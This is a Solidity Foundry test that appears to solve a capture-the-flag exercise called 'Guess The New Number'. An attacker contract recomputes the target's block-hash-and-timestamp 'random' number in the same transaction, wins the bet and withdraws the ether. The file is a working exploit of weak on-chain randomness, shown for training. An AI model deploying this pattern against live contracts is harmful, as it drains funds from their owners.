// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/4.GuessTheNewNumber.sol";

contract Oracle {
    function getAnswer() public view returns (uint8) {
        return
            uint8(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            blockhash(block.number - 1),
                            block.timestamp
                        )
                    )
                )
            );
    }

    function attack(GuessTheNewNumber t) external payable {
        t.guess{value: 1 ether}(getAnswer());
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract CounterTest is Test {
    GuessTheNewNumber public target;

    address player = vm.addr(1);

    function setUp() public {
        target = new GuessTheNewNumber{value: 1 ether}();
        vm.label(address(target), "Target");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testGuess() public {
        vm.startPrank(address(player));

        Oracle exploit = new Oracle();

        exploit.attack{value: 1 ether}(target);

        assertTrue(target.isComplete());
    }
}
